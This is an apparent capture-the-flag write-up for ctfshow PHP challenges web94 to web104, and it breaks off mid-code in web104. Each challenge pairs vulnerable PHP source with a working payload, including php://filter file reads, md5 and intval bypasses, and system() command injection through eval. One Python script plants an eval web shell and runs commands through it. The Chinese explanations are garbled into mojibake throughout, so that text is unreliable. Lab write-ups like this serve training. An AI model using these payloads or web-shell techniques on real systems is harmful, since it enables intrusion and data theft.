class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">strpos(string,find,start)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚</td></tr></tbody></table><table><thead><tr><th align="left">è¿”å›å€¼ï¼š</th><th align="left">è¿”å›å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å› FALSEã€‚<br><strong>æ³¨é‡Šï¼š</strong>å­—ç¬¦ä¸²ä½ç½®ä» 0 å¼€å§‹ï¼Œä¸æ˜¯ä» 1 å¼€å§‹ã€‚</th></tr></thead></table><p>æ‰€ä»¥ä¹Ÿå°±æ˜¯è¦æ±‚ä¼ è¿›çš„ num ä¸­å¿…é¡»å¾—å«æœ‰ 0 æ‰èƒ½ç»•è¿‡ï¼Œpayload ä¸ºï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=4476.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flagï¼šctfshow{8fbc9a71-cdff-4127-96f3-b3f4d63e1ebb}</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==4476)&#123;        die("no no no!");    &#125;    if(preg_match("/[a-z]|\./i", $num))&#123;        die("no no no!!");    &#125;    if(!strpos($num, "0"))&#123;        die("no no no!!!");    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€æ¬¡æ¯”ä¸Šä¸€é¢˜å¤šå¤šè™‘äº†ä¸€ä¸ªç‚¹.,ä½†åˆå¿…é¡»æœ‰ 0ï¼Œæ‰€ä»¥é‡‡ç”¨ 8 è¿›åˆ¶<br>intval ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦+å’Œç©ºå®¢è¿›è¡Œåˆ é™¤ï¼Œæ‰€ä»¥ payload ä¸ºï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=+010574 æˆ–è€…?num= 010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ° flag</p><h4 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phphighlight_file(__FILE__);if(isset($_GET['u']))&#123;    if($_GET['u']=='flag.php')&#123;        die("no no no");    &#125;else&#123;        highlight_file($_GET['u']);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>highligh**<strong>t</strong></strong>_file**    ( string <code>$filen``a``me</code>   [, bool <code>$return</code> = false  ] ) : <a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.pseudo-types.html#language.types.mixed">mixed</a><br>ä½¿ç”¨ PHP å†…ç½®çš„è¯­æ³•é«˜äº®å™¨æ‰€å®šä¹‰çš„é¢œè‰²ï¼Œæ‰“å°è¾“å‡ºæˆ–è€…è¿”å› <code>filename</code> æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚Â  </p><p>å‚æ•°</p><p><code>filename</code></p><p>æ¬²é«˜äº®æ–‡ä»¶çš„è·¯å¾„ã€‚       </p><p><code>return</code></p><p>è®¾ç½®è¯¥å‚æ•°ä¸º <code>TRUE</code> ä½¿å‡½æ•°è¿”å›é«˜äº®åçš„ä»£ç ã€‚       </p><p>è¿”å›å€¼</p><p>å¦‚æœ <code>ret``u``r``n</code> è®¾ç½®ä¸º <code>TRUE</code>ï¼Œé«˜äº®åçš„ä»£ç ä¸ä¼šè¢«æ‰“å°è¾“å‡ºï¼Œè€Œæ˜¯ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ã€‚     é«˜äº®æˆåŠŸè¿”å› <code>TRUE</code>ï¼Œå¦åˆ™è¿”å› <code>FALSE</code>ã€‚Â </p><p>æ‰€ä»¥ç›´æ¥å¯ä½¿ç”¨ php ä¼ªåè®®å³å¯ï¼Œpayload å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?u=php://filter/convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†å°†æ‹¿åˆ°å¯†æ–‡è¿›è¡Œ BASE64 è§£å¯†å³å¯æ‹¿åˆ° flagï¼š<br>ctfshow{894b6c31-5fdd-4680-bd89-7363cf669dbf}</p><h4 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if (isset($_POST['a']) and isset($_POST['b'])) &#123;if ($_POST['a'] != $_POST['b'])if (md5($_POST['a']) === md5($_POST['b']))echo $flag;elseprint 'Wrong.';&#125;?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>md5å¼ºæ¯”è¾ƒï¼ˆçœ‹å¤§ä½¬åšå®¢<a href="https://www.wlhhlc.top/posts/16813/">https://www.wlhhlc.top/posts/16813/</a>ï¼‰<br>md5å‡½æ•°å¤„ç†æ•°ç»„æ—¶ä¼šè¿”å›NULLï¼Œæ„é€ NULL=NULLå³å¯ï¼Œ</p><p>åˆ™payloadä¸ºï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">a[]=1&amp;b[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");$_GET?$_GET=&amp;$_POST:'flag';$_GET['flag']=='flag'?$_GET=&amp;$_COOKIE:'flag';$_GET['flag']=='flag'?$_GET=&amp;$_SERVER:'flag';highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¯ä»¥çœ‹åˆ°åªéœ€ç®¡ç¬¬2è¡Œå’Œç¬¬6è¡Œå³å¯ï¼Œç¬¬äºŒè¡Œçš„æ„æ€æ˜¯å¦‚æœgetä¼ å‚ï¼Œåˆ™å°†posté‡Œçš„å€¼èµ‹ç»™getï¼Œåˆ™å¯æ„é€ payloadï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?flag=flagpostHTTP_FLAG='flag'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{a7e2e094-77c9-4d6a-b3e0-703186123675}</p><h4 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>array_pushï¼šå°†ä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒå‹å…¥æ•°ç»„çš„æœ«å°¾ï¼ˆå…¥æ ˆï¼‰Â <br> in_array(<a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.pseudo-types.html#language.types.mixed">m</a><a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.pseudo-types.html#language.types.mixed">ixed</a> <code>$needle</code>     , array <code>$hays``ta``ck</code>   [, bool <code>$strict</code> = <code>FALSE</code>    ]Â  )ï¼šæ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼</p><p>å‚æ•°</p><p><code>n``e``edle</code></p><p>å¾…æœç´¢çš„å€¼ã€‚ï¼ˆå¦‚æœ <code>needle</code> æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™æ¯”è¾ƒæ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚Â  ï¼‰</p><p> <code>hay``s``tack</code></p><p>å¾…æœç´¢çš„æ•°ç»„ã€‚Â </p><p> <code>strict</code></p><p>å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•° <code>strict</code> çš„å€¼ä¸º<code>TRUE</code> åˆ™ <strong>in_array()</strong> å‡½æ•°è¿˜ä¼šæ£€æŸ¥<code>needle</code> çš„<a href="https://mk:@MSITStore:C:\Users\asus\Desktop%E5%B7%A5%E5%85%B7\php7.3.8%E6%89%8B%E5%86%8C%EF%BC%88%E5%AE%98%E7%BD%91%EF%BC%89\php7.3.8%EF%BC%88%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BD%EF%BC%89.chm::/res/language.types.html">ç±»å‹</a>æ˜¯å¦å’Œ      <code>h``aystack</code> ä¸­çš„ç›¸åŒã€‚Â </p><p> å³stricä¸ºflaseæ—¶ï¼Œä¸ºå¼±æ¯”è¾ƒã€‚</p><p><img src="/images/web_99a.png"></p><p><img src="/images/web_99b.png"></p><p><img src="/images/web_99c.png"></p><p><img src="/images/web_99d.png"></p><p>æˆ–ç”¨pythonè„šæœ¬è·‘ä¹Ÿå¯ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#-- coding:UTF-8 --</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://cf9d71b2-0624-477b-a743-68be04b5f7e5.challenge.ctf.show/"</span>url1 <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?n=123.php"</span>data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'content'</span><span class="token punctuation">:</span> <span class="token string">'&lt;?php @eval($_POST[A]);?>'</span><span class="token punctuation">&#125;</span>shell <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">)</span>shell_url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"123.php"</span>test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>shell_url<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å†™å…¥shellæˆåŠŸ"</span><span class="token punctuation">)</span>    data2<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token string">'system("tac flag36d.php");'</span>    <span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>shell_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);&#x2F;&#x2F;flagÂ inÂ classÂ ctfshow;$ctfshowÂ &#x3D;Â newÂ ctfshow();$v1&#x3D;$_GET[&#39;v1&#39;];$v2&#x3D;$_GET[&#39;v2&#39;];$v3&#x3D;$_GET[&#39;v3&#39;];$v0&#x3D;is_numeric($v1)Â andÂ is_numeric($v2)Â andÂ is_numeric($v3);if($v0)&#123;Â Â Â Â if(!preg_match(&quot;&#x2F;\;&#x2F;&quot;,Â $v2))&#123;Â Â Â Â Â Â Â Â if(preg_match(&quot;&#x2F;\;&#x2F;&quot;,Â $v3))&#123;Â Â Â Â Â Â Â Â Â Â Â Â eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);Â Â Â Â Â Â Â Â &#125;Â Â Â Â &#125;Â &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ ¹æ®ifé‡Œçš„åˆ¤æ–­æ¡ä»¶å¯ä»¥å‘ç°v2é‡Œä¸èƒ½æœ‰åˆ†å·ï¼Œv3é‡Œéœ€è¦æœ‰åˆ†å·ï¼Œç„¶ååˆå› ä¸º=çš„ä¼˜å…ˆçº§å¤§äºandï¼Œåˆ™å¯ä»¥ä»¤v1=1</p><p>åˆ™payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"tac%20ctfshow.php"</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°flag,å†å°†0x2dä¸º-</p><p>åˆ™flagä¸ºï¼šctfshow{71e05a2f-b325-4095-bfce-3424c1f31559}</p><h4 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">//</span>flag <span class="token keyword">in</span> <span class="token keyword">class</span> <span class="token class-name">ctfshow</span><span class="token punctuation">;</span>$ctfshow <span class="token operator">=</span> new ctfshow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$v1<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v2<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v3<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v0<span class="token operator">=</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token keyword">and</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span> <span class="token keyword">and</span> is_numeric<span class="token punctuation">(</span>$v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$v0<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> $v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>!preg_match<span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"$v2('ctfshow')$v3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜å¤šäº†å¾ˆå¤šçš„è¿‡æ»¤ï¼Œä½†ä¸€æ—¶æ‰¾ä¸åˆ°æ€è·¯ï¼Œçœ‹æ¥å“ˆhintï¼Œå‘ç°ä½¿ç”¨äº†ä¸€ä¸ªReflectionClassç±»ï¼Œä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼ŒæŸ¥é˜…èµ„æ–™ï¼Œå‘ç°<strong>ReflectionCl****ass</strong> ç±»æŠ¥å‘Šäº†ä¸€ä¸ªç±»çš„æœ‰å…³ä¿¡æ¯ã€‚Â åˆå»çœ‹çœ‹çœ‹å„ä½å¸ˆå‚…ä»¬çš„åšå®¢ï¼Œå¾—çŸ¥PHP Reflection APIæ˜¯PHP5æ‰æœ‰çš„æ–°åŠŸèƒ½ï¼Œå®ƒæ˜¯ç”¨æ¥å¯¼å‡ºæˆ–æå–å‡ºå…³äºç±»ã€æ–¹æ³•ã€å±æ€§ã€å‚æ•°ç­‰çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Šã€‚<br>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span>echo new ReflectionClass<span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°$flag_a66fbbd30x2d10020x2d4dc50x2d9c150x2d5def81d63d5<br>ç»§ç»­å°†0x2dæ¢æˆ-</p><p>å¾—ctfshow{a66fbbd3-1002-4dc5-9c15-5def81d63d5}ï¼Œå‘ç°è¿˜å°‘ä¸€ä½ï¼Œè¿›è¡Œçˆ†ç ´ï¼Œä¾æ¬¡æ·»åŠ [0-9][a-f]è¿›è¡Œå°è¯•ã€‚ä¸€ç›´å°è¯•åˆ°fæ‰æˆåŠŸã€‚</p><p>ctfshow{a66fbbd3-1002-4dc5-9c15-5def81d63d5f}</p><h4 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>$v1 <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v2 <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v3 <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>$v4 <span class="token operator">=</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span> <span class="token keyword">and</span> is_numeric<span class="token punctuation">(</span>$v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$v4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $s <span class="token operator">=</span> substr<span class="token punctuation">(</span>$v2<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $<span class="token builtin">str</span> <span class="token operator">=</span> call_user_func<span class="token punctuation">(</span>$v1<span class="token punctuation">,</span>$s<span class="token punctuation">)</span><span class="token punctuation">;</span>    echo $<span class="token builtin">str</span><span class="token punctuation">;</span>    file_put_contents<span class="token punctuation">(</span>$v3<span class="token punctuation">,</span>$<span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿›è¡Œç‰¹æ®Šæ„é€ ï¼š</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.phppostv1=hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶åå†è®¿é—®1.phpå°±èƒ½çœ‹åˆ°flag<br><img src="/images/web_102.png"></p><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°è¿™é¢˜è™½ç„¶å¯¹strè¿›è¡Œäº†è¿‡æ»¤phpå­—æ®µï¼Œä½†å¹¶æ²¡æœ‰ä»€ä¹ˆå½±å“ï¼Œç»§ç»­ä½¿ç”¨ä¸Šä¸€é¢˜çš„payload</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.phppostv1=hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°flagï¼šctfshow{6d412560-54c7-4afb-adef-3bf37b91c21b}</p><h4 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span 